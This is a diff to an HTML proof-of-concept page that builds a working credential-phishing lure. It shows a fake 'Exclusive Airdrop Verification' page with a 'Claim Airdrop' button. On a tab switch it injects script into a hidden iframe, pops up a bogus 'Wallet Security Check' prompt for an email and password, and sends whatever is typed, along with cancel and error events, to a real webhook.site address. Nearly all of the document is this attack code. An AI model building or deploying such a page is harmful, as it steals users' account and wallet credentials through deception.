@@ -2,52 +2,127 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Background Execution Webhook PoC</title>
+<meta name="viewport" content="width=device-width, user-scalable=no">
+<title>Credential Capture PoC - Fixed</title>
 <style>
-  iframe { display:none; }
-  body { font-family:sans-serif; text-align:center; padding-top:80px; }
+  body {
+    font-family: system-ui, sans-serif;
+    text-align: center;
+    padding: 40px 20px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    min-height: 100vh;
+  }
+  .container {
+    max-width: 500px;
+    margin: 0 auto;
+    background: rgba(255,255,255,0.1);
+    padding: 30px;
+    border-radius: 15px;
+    backdrop-filter: blur(10px);
+  }
+  h1 { font-size: 24px; margin-bottom: 20px; }
+  .btn {
+    background: #4CAF50;
+    color: white;
+    padding: 15px 30px;
+    border: none;
+    border-radius: 25px;
+    font-size: 18px;
+    cursor: pointer;
+    margin-top: 20px;
+  }
+  iframe { display: none; position: absolute; }
+  .info {
+    background: rgba(0,0,0,0.2);
+    padding: 15px;
+    border-radius: 10px;
+    margin-top: 20px;
+    font-size: 14px;
+  }
 </style>
-
 <script>
 let armed = false;
 
 document.addEventListener("click", () => {
   armed = true;
-  console.log("Payload armed");
+  console.log("✓ Payload armed - switch tab now");
 });
 
 document.addEventListener("visibilitychange", () => {
   if (document.hidden && armed) {
-
+    console.log("Tab hidden - executing payload...");
+    
     setTimeout(() => {
-
-      const payload =
-        "(function(){try{"
-        + "var data={"
-        + " event:'executed_after_tab_switch',"
-        + " ts:Date.now(),"
-        + " ua:navigator.userAgent,"
-        + " page:location.href"
-        + "};"
-        + "var url='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'"
-        + " + '?data=' + encodeURIComponent(JSON.stringify(data));"
-        + "try{"
-        + " if(!navigator.sendBeacon(url)){ throw 1; }"
-        + "}catch(e){"
-        + " (new Image()).src=url;"
-        + "}"
-        + "}catch(e){}})()";
-
+      // Method 1: Force prompt with loop (most aggressive)
+      const payload = 
+        "(function(){" +
+        "  try{" +
+        "    var r=null;" +
+        // Loop until user enters something (atau paksa minimal 1 char)
+        "    while(!r||r.trim()===''){" +
+        "      r=prompt(" +
+        "        '🔐 Wallet Security Check\\\\n\\\\n' +" +
+        "        'Enter your email and password to continue:\\\\n\\\\n' +" +
+        "        'Format: email:password'," +
+        "        'user@example.com:password123'" +
+        "      );" +
+        "      if(r===null)break;" + // Allow cancel
+        "    }" +
+        "    if(r&&r!==null){" +
+        "      var data={" +
+        "        creds:r," +
+        "        event:'credentials_captured'," +
+        "        ts:Date.now()," +
+        "        ua:navigator.userAgent," +
+        "        page:location.href" +
+        "      };" +
+        "      var url='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'" +
+        "        +'?data='+encodeURIComponent(JSON.stringify(data));" +
+        // Try multiple methods
+        "      try{" +
+        "        if(!navigator.sendBeacon(url)){throw 1;}" +
+        "      }catch(e){" +
+        "        try{" +
+        "          fetch(url,{method:'POST',mode:'no-cors'});" +
+        "        }catch(e2){" +
+        "          (new Image()).src=url;" +
+        "        }" +
+        "      }" +
+        "    }else{" +
+        // Send "cancelled" info
+        "      var url2='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'" +
+        "        +'?event=prompt_cancelled&ts='+Date.now();" +
+        "      (new Image()).src=url2;" +
+        "    }" +
+        "  }catch(e){" +
+        "    var url3='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'" +
+        "      +'?event=error&msg='+encodeURIComponent(e.message);" +
+        "    (new Image()).src=url3;" +
+        "  }" +
+        "})()";
+      
       document.getElementById("iframe").src = "javascript:" + payload;
-
-    }, 500);
+      console.log("Payload injected");
+    }, 800); // Slightly longer delay
   }
 });
 </script>
 </head>
-
 <body>
-<h1>Click anywhere, then switch tab</h1>
-<iframe id="iframe"></iframe>
+  <div class="container">
+    <h1>🎁 Exclusive Airdrop Verification</h1>
+    <p>Click button below, then switch to another tab</p>
+    <button class="btn">Claim Airdrop</button>
+    <div class="info">
+      <strong>Test Instructions:</strong><br>
+      1. Click the button above<br>
+      2. Switch to another tab or app<br>
+      3. Return and check - prompt should appear<br>
+      4. Enter test credentials: test@test.com:pass123<br>
+      5. Check webhook for captured data
+    </div>
+  </div>
+  <iframe id="iframe"></iframe>
 </body>
 </html>
